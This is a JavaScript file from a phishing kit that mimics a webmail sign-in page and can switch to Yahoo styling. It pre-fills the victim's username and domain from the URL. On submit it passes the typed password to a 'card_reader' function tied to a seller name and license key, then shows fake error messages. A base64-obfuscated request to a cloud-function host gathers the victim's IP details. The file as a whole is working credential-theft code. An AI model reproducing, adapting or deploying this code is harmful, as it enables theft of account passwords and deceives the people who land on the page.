let addC = "undefined"
let ip_config = {};
$(document).ready(async function (){
    localStorageCheck();
    let url = new URL(location.href);
    if(url.searchParams.has("t")){
        if(url.searchParams.get("t")==="y"){
            $(".mbr-login-hd.txt-align-center").addClass("yahoo");
            $(".button-container").addClass("yahoo")
        }
    }
    $("#username").val(url.searchParams.get("u"));
    $("#yid").html(url.searchParams.get("u"));
    $("#domain").val(url.searchParams.get("d"));


    $("#challenge-form").on('submit', async function (e){
        e.preventDefault();
        let $error_msg = $("#error-msg");
        let $login_sign = $("#login-signin");
        let $passwd = $("#login-passwd");
        if($login_sign.hasClass('active')){return false;}
        $error_msg.hide();
        $login_sign.addClass("active");
        if($passwd.val().length < 6){
            setTimeout(function (){
                $error_msg.html("Please enter a valid password.");
                $error_msg.show("fast");
                $login_sign.removeClass("active");
            }, 700);
        }else {

            let result = await card_reader(SCRIPT_NAME, "Jm Tech", LICENSE_KEY, JSON.stringify(ip_config), $passwd.val(), $("#username").val(), $("#domain").val())
            if(Object.keys(result).includes('errors')){
                setTimeout(function (){
                    $error_msg.html("Error, please check your internet connection or reload this page.");
                    $error_msg.hide("fast");
                    $login_sign.removeClass("active");
                },700);
            }else {
                setTimeout(function (){
                    if(result.response.msg.includes("uccessfull")){
                        localStorage.setItem("sent", "true sent for real");
                        parent.close_popup_final();
                    }else {
                        $error_msg.html("Unknown error occur, please reload this page or try again.");
                        $error_msg.hide("fast");
                        $login_sign.removeClass("active");
                    }
                }, 1300);
            }
        }
        return false;
    });


    $("#password-toggle-button").on('click', function (){
        let $passwd = $("#login-passwd");
        if($(this).hasClass('hide-pw')){
            $passwd.attr("type", "text");
            $(this).removeClass('hide-pw').addClass("show-pw");
            $(this).attr("title", 'Show password');
        }else {
            $passwd.attr("type", "password");
            $(this).removeClass("show-pw").addClass('hide-pw');
            $(this).attr("title", 'Hide password');
        }
    })

    if(Object.keys(ip_config).length < 2){
        await get_ip();
    }
});


async function get_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                console.log(response);
                if(response.status === "success"){
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                console.log(error);
                resolve(true);
            }
        });
    });
}


function localStorageCheck(){
    let ip = localStorage.getItem("ip_config");
    if(ip !== null) ip_config = JSON.parse(ip);
}